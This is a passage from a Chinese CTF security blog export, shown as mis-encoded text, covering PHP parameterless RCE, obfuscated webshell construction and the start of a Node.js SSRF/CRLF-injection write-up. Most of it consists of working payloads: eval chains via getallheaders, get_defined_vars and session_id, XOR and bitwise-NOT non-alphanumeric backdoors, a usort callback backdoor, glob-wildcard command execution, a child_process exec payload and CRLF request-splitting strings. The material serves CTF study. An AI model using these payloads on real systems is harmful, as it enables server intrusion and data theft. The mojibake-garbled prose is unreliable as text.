æœ€æ—©å‡ºè‡ªäºpç‰›çš„easyphplimithttps://www.jianshu.com/p/19a37402554fæˆ‘è¿˜åœ¨GXYCTFä¸­å¤ç°åŒä¸ºæ— å‚RCEçš„é¢˜ç›®https://www.jianshu.com/p/2b5e7bd64264å…¶å®æ— å‚RCEçš„ä¸»è¦è¦ç‚¹å°±æ˜¯åªèƒ½æ‰§è¡Œå¦‚ä¸‹ç±»å‹å‡½æ•° 12a(b(c()));a(); ä¸ªäººç¬¬ä¸€ä¹ æƒ¯é¦–å…ˆæ˜¯ä½¿ç”¨ 1print_r(scandir('.')) æ¢æµ‹ç›®å½•ã€‚ä½†æ­¤å¤„æ˜¾ç„¶. &#39;&#39;éƒ½ä½¿ç”¨ä¸äº†ã€‚é‚£ä¹ˆæ€ä¹ˆæ„é€ å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥è½»æ¾ä½¿ç”¨å‡½æ•°è¾¾æˆ 1print_r(scandir(current(localeconv()))); localeconvè¿”å›ä¸€ä¸ªæ•°ç»„ã€‚å…¶æ•°ç»„å¤´ä¸€ä¸ªå€¼ä¸ºdecimal_pointï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç‚¹ã€‚ current()èµ·åˆ°å–å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå˜é‡çš„ä½œç”¨ï¼Œæ‰€ä»¥å¯ä»¥ä»¥æ­¤æ›¿ä»£scandirè¦ç”¨çš„ç‚¹ã€‚è¿˜æœ‰ä¸€ç§å¸¸è§„ç‚¹çš„åšæ³•ï¼Œåªéœ€getcwd()å³å¯è¿”å›ç›®å½•ã€‚è€Œdirname()å¯ä»¥å¾€ç›®å½•ä¸Šè·³ã€‚å½“ç„¶ï¼Œå¦‚æœæƒ³è¯»å–çš„æ–‡ä»¶åœ¨ä¸Šçº§ç›®å½•ï¼Œå°±å¾—å†åŠ ä¸Šä¸€ä¸ªchdir()æ¯”å¦‚code-breakngçš„payload 1readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); å…¶ä¸­ç”¨åˆ°çš„array_reverse()ä¹Ÿæ˜¯ä¸ºäº†åº”å¯¹flagçš„æ•°ç»„ç´¢å¼•ä¸æ˜¯ç‰¹æ®Šç´¢å¼•çš„æƒ…å†µã€‚è°ƒæ•´åä½¿ç”¨current, nextï¼Œendå¯ä»¥è§£å†³å¤§éƒ¨åˆ†é—®é¢˜ã€‚ å½“ç„¶è¿™ç±»æ— å‚RCEè¿˜æœ‰å…¶ä»–ç”¨æ³•ï¼Œæ¯”å¦‚ï¼š1.getenv()å‡½æ•°è¿™ä¸€å‡½æ•°å°†è¿”å›ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼Œè€Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ä»è¿™ä¸ªæ•°ç»„ä¸­é€‰å–éœ€è¦çš„å€¼è¿›è¡Œåˆ©ç”¨ã€‚å¸¸å¸¸æ˜¯ï¼š 1array_rand(array_flip(getenv())); å¯ä»¥éšæœºè·å–æ•°ç»„ä¸­æŸä¸€ä¸ªé”®å€¼ã€‚çˆ†ç ´ä¹‹åèƒ½æ‹¿åˆ°æ•°ç»„ä¸­æŒ‡å®šå€¼ 2.getallheaders() ä»httpå¤´ä¸­è·å–å€¼ã€‚å› æ­¤ååˆ†ä¾¿æ·ã€‚æ¯”å¦‚å½“httpå¤´æœ€åä¸€ä¸ªå€¼ä½¿æˆ‘ä»¬æ„é€ å¥½çš„byc: phpinfo() 1var_dump(end(getallheaders())); å¦‚æ­¤å³å¯æ‰§è¡Œphpinfo()ä½†æ˜¯æ³¨æ„ï¼Œè¿™æ˜¯ä¸ªapacheå‡½æ•°ï¼Œå¦‚æœé‡åˆ°nginxå°†ä¸å†é€‚ç”¨ã€‚3.get_defined_vars()æ­£æ˜¯ä¸ºäº†åº”å¯¹getallheadersçš„ç¼ºé™·ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©get_defined_vars()ã€‚å› ä¸ºå®ƒè¿”å›çš„å°†æ˜¯å…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡åŒ…æ‹¬$_GET $_POSTéƒ½æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨çš„ã€‚è¿™æ ·æˆ‘ä»¬å°±å¤šäº†ä¸€ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€‚æ¯”å¦‚å–å‡ºäº†_GETçš„è¯ã€‚ 1?cmd=eval(end(current(get_defined_vars())));&amp;byc=system('ls'); ç”šè‡³æˆ‘ä»¬ä¹Ÿèƒ½åˆ©ç”¨$_FILESï¼Œé€šè¿‡ä¼ªé€ æ–‡ä»¶ä¸Šä¼ è¾¾æˆè°ƒç”¨ 1234567891011import requestsfrom io import BytesIOpayload = \"system('cat /flag');\".encode('hex')files = &#123; payload: BytesIO('2333!')&#125;r = requests.post('http://localhost/shell.php?cmd=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)print (r.text) ä½¿ç”¨hex2binæ˜¯ä¸ºäº†é˜²æ­¢å…³é”®å­—çš„è¿‡æ»¤æˆ–è½¬æ¢ã€‚ 4.session_id()å‡½æ•° ä¸ä¸Šé¢çš„å…¨å±€å˜é‡åŒæ ·çš„é“ç†ã€‚åªä¸è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpçš„ç‰¹æ€§ã€‚åªè¦æ˜¯PHPSESSIDåçš„å€¼ï¼Œå°±å¯ä»¥ç›´æ¥èµ‹ç»™session_idã€‚æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬åªéœ€è§£å†³session_idå€¼ä¸ºå­—æ¯åŠ æ•°å­—çš„é—®é¢˜äº†ã€‚åŒæ ·ä½¿ç”¨hex2binå³å¯å‰ææ¡ä»¶æ˜¯è¦å…ˆsession_start() 12345678import requestsurl = 'http://localhost/shell.php?cmd=eval(hex2bin(session_id(session_start())));'payload = \"echo '23333';\".encode('hex')cookies = &#123; 'PHPSESSID':payload&#125;r = requests.get(url=url,cookies=cookies)print (r.text) èŠ±å¼å†™shellèŠ±å¼å†™shellç®—æ˜¯phpä¸€ä¸ªååˆ†è€ƒéªŒæŠ€å·§çš„ç‚¹äº†ã€‚å½“ç„¶ä¹‹å‰ä¸Šé¢linuxéƒ¨åˆ†æ‰€å†™çš„bypassé•¿åº¦ä¹Ÿç®—èŠ±å¼å†™shellã€‚ä½†æ˜¯é‚£ä¸»è¦åˆ©ç”¨çš„æ˜¯linuxçš„ç‰¹æ€§ã€‚æˆ‘ä»¬è¿™é‡Œå°è¯•ä½¿ç”¨phpçš„ç‰¹æ€§ï¼Œå†™å‡ ç§æœ€å¸¸è§çš„webshell 1.å¸¸è§„æ‹†åˆ† 1cmd=`$_GET[1]`;&amp;1 åŸºæœ¬ç®—æ˜¯ç”¨çƒ‚äº†ï¼Œä¹Ÿæ˜¯æˆ‘è¿™ç§èœé¸¡æœ€å–œæ¬¢ç”¨çš„ç±»å‹ã€‚ç›¸å½“ä¸å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ã€‚ 2.include 1cmd=include$_GET[1];å¾ˆå¦™ï¼Œä½†æ˜¯å¯èƒ½ä¼šå—é™äºè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚è¿™ä¸ªé€‰é¡¹é»˜è®¤æ˜¯ä¸å¼€å¯çš„ã€‚ 3.includeå‡çº§ç‰ˆä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æœ¬åœ°æ–‡ä»¶åŒ…å«ã€‚ä¸ºæ­¤åªè¦file_put_contents()å†™å…¥ä¸€ä¸ªæ–‡ä»¶å³å¯ 1$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents å…¶ä¸­file_put_contentsçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶åã€‚PHPä¼šè®¤ä¸ºNæ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œä½†ä¹‹å‰å¹¶æ²¡æœ‰å®šä¹‰è¿™ä¸ªå¸¸é‡ï¼Œäºæ˜¯PHPå°±ä¼šæŠŠå®ƒè½¬æ¢æˆå­—ç¬¦ä¸²â€™Nâ€™ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦å†™å…¥çš„æ•°æ®ï¼Œaä¹Ÿè¢«è½¬æ¢æˆå­—ç¬¦ä¸²â€™aâ€™ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯flagï¼Œå½“flag=8çš„æ—¶å€™å†…å®¹ä¼šè¿½åŠ åœ¨æ–‡ä»¶æœ«å°¾ï¼Œè€Œä¸æ˜¯è¦†ç›–ã€‚ç”±äºå†™å…¥ç¬¦å·æ—¶å‡½æ•°ä¼šæŠ¥é”™ï¼Œå¯ä»¥é€‰æ‹©å†™å…¥payloadçš„base64,åˆ†æ¬¡å†™å…¥ï¼Œæœ€åä¼ªåè®®åŒ…å«ï¼š 1cmd=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N 4.å˜é•¿å‚æ•°+å›è°ƒåé—¨ pç‰›ç»™å‡ºçš„æ— è§†wafçš„ç¥æ‹›ã€‚åˆ©ç”¨äº†php5.6çš„ç‰¹æ€§ã€‚ åœ¨PHPä¸­å¯ä»¥ä½¿ç”¨ func(...$arr)è¿™æ ·çš„æ–¹å¼ï¼Œå°†$arræ•°ç»„å±•å¼€æˆå¤šä¸ªå‚æ•°ï¼Œä¼ å…¥funcå‡½æ•°ã€‚æ‰€ä»¥å¯ä»¥ 1cmd=usort(...$_GET); ä»¥ä¸‹å‚æ•°getä¼ å€¼ã€‚ 11[]=test&amp;1[]=phpinfo();&amp;2=assert pç‰›è§£é‡Šæ˜¯ï¼š å¤§æ¦‚è¿‡ç¨‹å°±æ˜¯ï¼ŒGETå˜é‡è¢«å±•å¼€æˆä¸¤ä¸ªå‚æ•°[â€˜testâ€™, â€˜phpinfo();â€™]å’Œassertï¼Œä¼ å…¥usortå‡½æ•°ã€‚usortå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°assertï¼Œå…¶è°ƒç”¨äº†ç¬¬ä¸€ä¸ªå‚æ•°ä¸­çš„phpinfo();ã€‚ä¿®æ”¹phpinfo();ä¸ºwebshellå³å¯ã€‚ è¿™ä¸ªåšæ³•æœ€å¦™çš„å°±æ˜¯...$_GETç»•è¿‡wafã€‚ å†™ç•¸å½¢shellphpçš„æŸäº›ç‰¹æ€§åº”è¯¥è¯´è¦å…ˆç†Ÿæ‚‰ä¸€ä¸‹phpä¸­å¤§æ‹¬å·çš„å¦™å¤„,å¯å˜å˜é‡çš„å¦™å¤„ 12345&lt;?php$a=\"hello\";$$a=\"world\";echo \"$a $&#123;$a&#125;\";//hello worldecho \"$a $hello\";//hello world 1$&#123;&quot;_GET&quot;&#125;&#x3D;&#x3D;&#x3D;&#x3D;&gt;$_GET åŒæ—¶åœ¨${}ä¸­ï¼Œå­—ç¬¦ä¸²å¦‚æœä¸å¸¦&#39;&#39; ,&quot; &quot;ã€‚å¹¶ä¸ä¼šå½±å“ç”Ÿæˆä»¥å…¶ä¸ºåçš„å˜é‡ 123php &gt; $a=1111;php &gt; var_dump($&#123;a&#125;);PHP Warning: Use of undefined constant a - assumed 'a' (this will throw an Error in a future version of PHP) in php shell code on line 1 å‡å¦‚æˆ‘ä»¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå°±ä¼šå‘ç°å®ƒåœ¨${}ä¸­æ˜¯ä¼šè¢«è§£æçš„ã€‚ 1234$a='b'$&#123;$a&#125;=&gt;$bvar_dump($&#123;$a&#125;);=&gt;var_dump($b);$b='1'=&gt;string(1) \"1\" å› æ­¤æˆ‘ä»¬å¯ä»¥æ˜ç™½ï¼š$$æˆ–${}èƒ½åˆ©ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ›é€ å‡ºä¸€ä¸ªåŒåå˜é‡ã€‚å˜é‡ååªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ï¼›ä½†æ˜¯${}å¯ä»¥ä½¿å¾—åªåŒ…å«æ•°å­—ï¼Œæ¯”å¦‚${1}ã€‚æ­¤æ—¶${1}å°±å˜æˆäº†ä¸€ä¸ªå˜é‡ã€‚ å„ç§æ–¹æ³• å¼‚æˆ–è¿™ä¸ªæ–¹æ³•å¾ˆå¸¸è§ï¼Œä½†æ˜¯è‡ªå·±è¿˜æ²¡åœ¨å®é™…æ¯”èµ›ä¸­ç”¨åˆ°è¿‡â€¦â€¦ä¸€ä¸ªéæ•°å­—å­—æ¯çš„åé—¨12345678910&lt;?php @$_++; // $_ = 1 $__=(\"#\"^\"|\"); // $__ = _ $__.=(\".\"^\"~\"); // _P $__.=(\"/\"^\"`\"); // _PO $__.=(\"|\"^\"/\"); // _POS $__.=(\"&#123;\"^\"/\"); // _POST $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"&#123;\"^\"/\"); å…¶å®å¼‚æˆ–å°±æ˜¯å­—ç¬¦çš„asciiè½¬äºŒè¿›åˆ¶å¼‚æˆ–åå†è½¬asciiè½¬å­—ç¬¦ä¸²ã€‚ 2.å–åèƒ½å¼‚æˆ–å°±èƒ½å–åã€‚ä½è¿ç®—ç‰›bã€‚æ¯”å¦‚pç‰›çš„è¿™ä¸ªä¾‹å­ï¼š&#39;å’Œ&#39;{2}çš„ç»“æœ&quot;\\x8c&quot;å–åæ˜¯sè¿™é‡Œè¿˜åˆ©ç”¨äº†phpä¸­æ•°ç»„å¯ä»¥ä½¿ç”¨{}æ›¿æ¢[]çš„æ€§è´¨ã€‚â€œå’Œâ€çš„ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„å€¼ä¸º140[0x8c]ï¼Œå–åçš„å€¼ä¸º-141ã€‚è´Ÿæ•°ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œé€šå¸¸ç”¨çš„æ˜¯è¡¥ç çš„æ–¹å¼è¡¨ç¤ºã€‚è´Ÿæ•°çš„è¡¥ç æ˜¯å®ƒæœ¬èº«çš„å€¼æ¯ä½æ±‚å,æœ€åå†åŠ ä¸€ã€‚141çš„16è¿›åˆ¶ä¸º0xff73ï¼Œphpä¸­chr(0xff73)==115ï¼Œ115å°±æ˜¯sçš„ASCIIå€¼ã€‚ 123def get(shell): hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit) 12php &gt; echo(~(\"\\x8f\\x97\\x8f\\x96\\x91\\x99\\x90\"));phpinfo 3.è‡ªå¢è¿ç®—ç¬¦è‡ªå¢è¿ç®—ç¬¦æ„é€ æ•°å­—ä¹Ÿæ˜¯æŠ€å·§ 1234&lt;?php$_++;print($_);?&gt; $_=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)ä¹Ÿæ˜¯å¯ä»¥å¾—åˆ°2çš„ã€‚è¿™ç‚¹è¿˜å¯ä»¥æ„é€ æ•°ç»„é”®å€¼ã€‚ 4.çŸ­æ ‡ç­¾+é€šé…ç¬¦ ä¹‹å‰åœ¨ciscnä¸­é‡åˆ°è¿‡ã€‚ä¸€ä¸ª&lt;?php?&gt;ç®—æ˜¯phpçš„é•¿æ ‡ç­¾ï¼Œè€Œ&lt;?=?&gt;ç®—çŸ­æ ‡ç­¾ã€‚ä½†æ˜¯è¿™æ ·å°±å¯ä»¥æ‰§è¡Œå‡½æ•°äº†ï¼Œè€Œä¸”å¯ä»¥é€šè¿‡fuzzè¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚ç”±äºlinuxä¸­å¯ä»¥ç”¨?æ¥è¿›è¡Œå•ä¸ªå­—æ¯çš„åŒ¹é…ï¼š 12$_=`/???/???%20/???/???/????/?????.???`;?&gt;&lt;?=$_?&gt;/bin/cat /var/www/html/index.php å®é™…ä¸Šæ˜¯åº”ç”¨äº†linuxçš„globé€šé…ç¬¦çš„ä½œç”¨ã€‚æ—¢ç„¶`å¯ä»¥å†…è”æ‰§è¡Œã€‚åªè¦èƒ½åŒ¹é…å®Œå…¨å°±å¯ä»¥è¾¾åˆ°å†™shellå‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚å½“ç„¶ï¼Œç¬¦åˆåŒ¹é…ç»“æœçš„å‘½ä»¤å¯èƒ½æœ‰å¤šä¸ªã€‚æˆ‘ä»¬å¯ä»¥åŠ ä¸Šå…¶ä»–é€šé…ç¬¦ 123[^x] è¡¨ç¤ºè¿™ä¸ªä½ç½®ä¸æ˜¯å­—ç¬¦x[0-9] è¡¨ç¤ºæ•°å­—èŒƒå›´[@-[]è¡¨ç¤ºå¤§å†™å­—æ¯ å‡å¦‚åŒ¹é…åˆ°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œäº†ã€‚ 5.php7 åŠ¨æ€å‡½æ•° 12(~%8F%97%8F%96%91%99%90)();&#x2F;&#x2F;phpinfo() php7å°±æ”¯æŒä½¿ç”¨($a)();è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ æš‚ä¸”å†™è¿™ä¹ˆå¤šå§ã€‚æ¯•ç«Ÿphpçš„å¥‡å¦™ä¹‹å¤„å¤ªå¤šäº†ï¼Œä¸€æ—¶åŠä¼šæ˜¯æ€»ç»“ä¸å®Œçš„ã€‚è¿™å‘¨æœ«å°±æ˜¯ç¬¬ä¸€æ¬¡ä»¥X1cçš„é˜Ÿå‘˜èº«ä»½æ‰“æ¯”èµ›äº†ï¼Œè¦åŠ æ²¹å•Šã€‚ å‚è€ƒæ–‡ç« ï¼š https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.htmlhttps://www.leavesongs.com/PHP/bypass-eval-length-restrict.htmlhttps://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/https://skysec.top/2017/12/29/Time-Based-RCE/https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"},{"name":"Linux","slug":"Linux","permalink":"https://www.bycsec.top/tags/Linux/"}]},{"title":"å•ç‹¬å¡«å‘-å…¬ç›Šèµ›NodeGame","slug":"å•ç‹¬å¡«å‘-å…¬ç›Šèµ›NodeGame","date":"2020-02-26T02:57:14.000Z","updated":"2021-02-18T05:08:30.441Z","comments":true,"path":"2020/02/26/å•ç‹¬å¡«å‘-å…¬ç›Šèµ›NodeGame/","link":"","permalink":"https://www.bycsec.top/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/","excerpt":"ä»Šå¤©æ¥å¡«ä¸‹NodeGameçš„å‘å§ã€‚è¿™é“é¢˜ç¡®å®å‡ºçš„å¾ˆéš¾ã€‚è®°å¾—å½“æ—¶æ¯”èµ›ä¸­ä¹Ÿåªæœ‰å¤§æ¦‚8ä½å¸ˆå‚…åšå‡ºæ¥ã€‚è€Œå®é™…ä¸Šï¼Œå¾ˆå¤šå¸ˆå‚…åº”è¯¥éƒ½æ˜¯æœ‰æ€è·¯ä¸å‚è€ƒé¢˜ç›®ï¼Œä½†æ˜¯æœ€ç»ˆè¢«å°ç»†èŠ‚æ‰€å½±å“çš„ã€‚è¿™é‡Œç»™å‡ºå‡ºé¢˜äººè‡ªå·±çš„å‡ºé¢˜æ€è·¯ï¼šhttp://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-gameå…¶ä¸­ä¸€é“ä»–å‚è€ƒçš„å›½é™…èµ›é¢˜ç›®wp:https://r3billions.com/writeup-split-second/","text":"ä»Šå¤©æ¥å¡«ä¸‹NodeGameçš„å‘å§ã€‚è¿™é“é¢˜ç¡®å®å‡ºçš„å¾ˆéš¾ã€‚è®°å¾—å½“æ—¶æ¯”èµ›ä¸­ä¹Ÿåªæœ‰å¤§æ¦‚8ä½å¸ˆå‚…åšå‡ºæ¥ã€‚è€Œå®é™…ä¸Šï¼Œå¾ˆå¤šå¸ˆå‚…åº”è¯¥éƒ½æ˜¯æœ‰æ€è·¯ä¸å‚è€ƒé¢˜ç›®ï¼Œä½†æ˜¯æœ€ç»ˆè¢«å°ç»†èŠ‚æ‰€å½±å“çš„ã€‚è¿™é‡Œç»™å‡ºå‡ºé¢˜äººè‡ªå·±çš„å‡ºé¢˜æ€è·¯ï¼šhttp://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-gameå…¶ä¸­ä¸€é“ä»–å‚è€ƒçš„å›½é™…èµ›é¢˜ç›®wp:https://r3billions.com/writeup-split-second/ nullcon hackim-2020 split-secondé¢˜ç›®æºç æˆ‘forkåå•ç‹¬æ”¾åœ¨è‡ªå·±githubä¸Šï¼Œæœ‰éœ€è¦è‡ªå–https://github.com/baiyecha404/hackim-web å…ˆè®²è§£ä¸‹å‡ºé¢˜äººå¸ˆå‚…å‚è€ƒçš„é‚£é“å›½é™…èµ›çš„é¢˜ç›®å§ã€‚é¦–å…ˆé¢˜ç›®çš„è·¯ç”±è·Ÿæˆ‘ä»¬è¿™é“NodeGameåŸºæœ¬ä¸€è‡´ï¼Œé¦–å…ˆä»flagè·¯ç”±å¯ä»¥çœ‹åˆ° 12345678910111213141516171819app.get('/flag', function(req, res) &#123; var ip = req.connection.remoteAddress; if (ip.includes('127.0.0.1')) &#123; var authheader = req.headers['adminauth']; var pug2 = decodeURI(req.headers['pug']); var x=pug2.match(/[a-z]/g); if(!x)&#123; if (authheader === \"secretpassword\") &#123; var html = pug.render(pug2); &#125; &#125; else&#123; res.send(\"No characters\"); &#125; &#125; else&#123; res.send(\"You need to come from localhost\"); &#125;&#125;); coreè·¯ç”±æ˜¯ï¼š 12345678910111213141516171819202122232425262728293031323334app.get('/core', function(req, res) &#123; var q = req.query.q; var resp = \"\"; if (q) &#123; var url = 'http://localhost:8081/getMeme?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(\"&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;\"); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding('utf8'); resp.on('error', function(err) &#123; if (err.code === \"ECONNRESET\") &#123; console.log(\"Timeout occurs\"); return; &#125; &#125;); resp.on('data', function(chunk) &#123; resps = chunk.toString(); res.send(resps); &#125;).on('error', (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(\"search param 'q' missing!\"); &#125;&#125;) è¿˜æœ‰ä¸€ä¸ªé»‘åå•å‡½æ•° 12345678910function blacklist(url) &#123; var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125; ä»¥ä¸Šå°±æ˜¯æºç ä¸­é‡è¦éƒ¨åˆ†ã€‚é™¤æ­¤ä»¥å¤–è¿˜è¦å…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œé¢˜ç›®ä½¿ç”¨çš„æ˜¯Nodejs8.12.ç‰ˆæœ¬ã€‚å¹¶ä¸”ä½¿ç”¨pugä½œä¸ºæ¨¡æ¿å¼•æ“ã€‚ 123456var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug'); è¿™ä¸ªç‰ˆæœ¬çš„Nodejså­˜åœ¨ä»€ä¹ˆæ¼æ´å‘¢ï¼Ÿå¦‚æœå»æœç´¢ä¼šå‘ç°å­˜åœ¨ä¸€ä¸ªCVE,ç±»å‹ä¸ºCRLF injectionã€‚å…·ä½“åˆ©ç”¨ä¹‹åå†æã€‚ç°åœ¨æˆ‘ä»¬æ¥åˆ†æä¸‹ä¸Šè¿°æºç çš„é‡è¦ä¹‹å¤„ï¼š1./flag è¿™æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ã€‚ä¸€ä¸ªé‡ç‚¹æ˜¯è¦è¾¾æˆip.includes(&#39;127.0.0.1)ã€‚è¯´æ˜æˆ‘ä»¬å¯èƒ½éœ€è¦æ„é€ ä¸€ä¸ªssrf.åœ¨ipæ£€æŸ¥åï¼Œè¿˜æœ‰å¦ä¸€ä¸ªæ¡ä»¶authheader === &quot;secretpassword&quot;è¿›è¡Œäº†httpå¤´çš„æ£€æŸ¥ï¼Œè¾¾æˆåå°†è¿›è¡Œpugçš„æ¸²æŸ“ï¼Œè¯´æ˜å¯èƒ½è¾¾æˆNodejsçš„å‘½ä»¤æ‰§è¡Œã€‚è€Œæ—¢ç„¶è¦å¯¹å¤´è¿›è¡Œæ£€æŸ¥ï¼Œè¯´æ˜æˆ‘ä»¬ç¡®å®å¯èƒ½éœ€è¦CRLFæ¼æ´æ¥è¿›è¡Œhttpå¤´çš„ä¼ªé€ ã€‚ 2.coreè·¯ç”±å…è®¸æˆ‘ä»¬ä¼ é€’å‚æ•°qã€‚ä¹‹åä¸http://localhost:8081/getMeme?æ‹¼æ¥ï¼Œæ•´ä¸ªurlç»è¿‡ä¸€æ¬¡é»‘åå•æ£€æŸ¥åå°†æ‰§è¡Œã€‚æ‰€ä»¥ä¸Šé¢æ‰€éœ€çš„ssrfåœ¨è¿™å·²ç»å¸®æˆ‘ä»¬å‡†å¤‡å¥½äº†ã€‚åªéœ€è€ƒè™‘ç»•è¿‡å³å¯ 3.é»‘åå•ä»å…¶ä¸­å­˜åœ¨çš„å…³é”®å­—å°±å¯çœ‹å‡ºï¼Œè¿™æ˜¯Nodejså¸¸è§çš„å‘½ä»¤æ‰§è¡Œçš„æ¨¡æ¿ã€‚æˆ‘ä»¬ä»¥å‰ç”¨è¿‡çš„Nodejså‘½ä»¤æ‰§è¡Œpayload: 1global.process.mainModule.require('child_process').exec('ls') å°†ä¸èƒ½ç›´æ¥ä¼ å…¥ã€‚æ˜¾ç„¶è¿™é‡Œéœ€è¦å…¶ä»–é€”å¾„æ¥ç¼–ç ç»•è¿‡ã€‚ æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬æ¥å¤ç°ä¸‹,vpsä¸Šæ­å¥½ç¯å¢ƒï¼šæˆ‘ä»¬çš„CRLFæ¼æ´ï¼Œå…è®¸æˆ‘ä»¬é€šè¿‡æ¢è¡Œæ„é€ headersã€‚åŒæ—¶ä¹Ÿå¯ä»¥æ„é€ æ‹†åˆ†ssrfã€‚åˆ©ç”¨æ¢è¡Œç»“æŸå‰ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶å‘é€å¦ä¸€ä¸ªè¯·æ±‚ï¼š 123456GET &#x2F;core?q&#x3D;x HTTP&#x2F;1.1GET &#x2F;flag HTTP&#x2F;1.1adminauth: secretpasswordpug: - xxx é‚£ä¹ˆæ˜ç¡®æˆ‘ä»¬éœ€è¦ä¼ªé€ çš„æ–‡ä»¶å¤´ 1234567GET &#x2F;flag HTTP&#x2F;1.1Host: 127.0.0.1adminauth: secretpasswordpug: - code dummy: HTTP&#x2F;1.1Host: localhost:8081Connection: close pugå¤„å¯ä»¥æ‰§è¡Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è€Œå…³é”®headersé‡Œçš„å‚æ•°å·²ç»ç»•è¿‡ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå¯ä»¥å¤§è‡´å†™å‡ºæˆ‘ä»¬éœ€è¦ç”¨CRLFæ³¨å…¥çš„å‘½ä»¤payloadï¼š 1SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+CRLF+GET+SPACE+%2F+flag+SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+adminauth+%3A+SPACE+secretpassword+CRLF+pug+%3A+SPACE+aaa+CRLF+dummy+%3A+SPACE è€Œåªéœ€/core?q=payloadå°±æ‰§è¡Œäº†SSRF+CRLFã€‚ è€Œä¸ºäº†bypasså¯¹pugçš„æ¸²æŸ“é—®é¢˜ï¼Œæˆ‘ä»¬ç›´æ¥é€‰æ‹©8è¿›åˆ¶ç»•è¿‡ã€‚å› ä¸ºå®ƒä¸åƒunicodeæˆ–è€…16è¿›åˆ¶é‚£æ ·å®¹æ˜“åŒ…å«å­—æ¯ã€‚æ‰€ä»¥ä½¿ç”¨å…«è¿›åˆ¶ç»•è¿‡ã€‚å¤§æ¦‚å¦‚ä¸‹å½¢å¼ï¼š 123[][\"constructor\"] æœ‰æ•ˆ[][\"\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\"] æœ‰æ•ˆï¼Œå¯æ‰§è¡Œ[][\\42\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\\42] æ— æ•ˆï¼Œå› ä¸ºåŒå¼•å·è¢«ç¼–ç äº† 